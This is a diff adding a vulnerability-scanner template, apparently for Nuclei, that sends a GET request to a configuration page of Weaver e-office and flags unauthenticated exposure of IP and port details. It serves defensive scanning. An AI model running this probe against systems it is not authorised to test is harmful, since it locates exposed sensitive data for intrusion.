@@ -1,0 +1,25 @@
+id: DVB-2023-5285
+info:
+  name: DVB-2023-5285
+  author: apple
+  severity: high
+  description: 泛微e-office是一种企业办公自动化软件解决方案，由中国的泛微网络科技股份有限公司开发和提供。它旨在帮助企业提高办公效率、优化业务流程和信息管理。泛微e-office
+    存在未授权访问，攻击者可以访问页面获取敏感信息。
+  reference:
+    - https://blog.csdn.net/qq_18193739/article/details/134020652
+  tags: tags
+http:
+  - raw:
+      - "GET /building/backmgr/urlpage/mobileurl/config_2.php HTTP/1.1\nHost: {{Hostname}}\n\
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML,\
+        \ like Gecko) Chrome/113.0.5666.197 "
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 端口
+      - type: word
+        part: body
+        words:
+          - IP地址
